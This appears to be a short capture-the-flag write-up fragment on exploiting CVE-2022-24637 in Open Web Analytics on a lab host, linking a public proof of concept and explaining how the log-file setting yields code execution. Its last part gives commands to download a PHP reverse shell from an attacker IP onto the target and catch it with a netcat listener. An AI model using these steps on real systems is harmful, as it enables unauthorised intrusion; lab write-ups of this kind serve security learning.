1) Once logged in as admin, there is a poc that exploits the settings page: [https://github.com/watchdog2000/cve-2022-24637_open-web-analytics-info-disclosure-to-rce](https://github.com/watchdog2000/cve-2022-24637_open-web-analytics-info-disclosure-to-rce)
2) For details about how this exploit works, read the second vulnerability on [https://devel0pment.de/?p=2494#vuln2](https://devel0pment.de/?p=2494#vuln2). Basically, there is lacking restriction on the config checking, so this can be exploited to set a different `base.error_log_file` (can be a php file) and a different logging level `base.error_log_level`.

```
3) Note that this shell is very unstable, you’d better upgrade to a better shell:
```
> cp /usr/share/webshells/php/php-reverse-shell.php w.php
# change the IP and port

# in the owa rce shell
SHELL> wget http://10.10.16.59/w.php

# run a nc listener and browse to http://openwebanalytics.vessel.htb/owa-data/logs/w.php in the browser
```
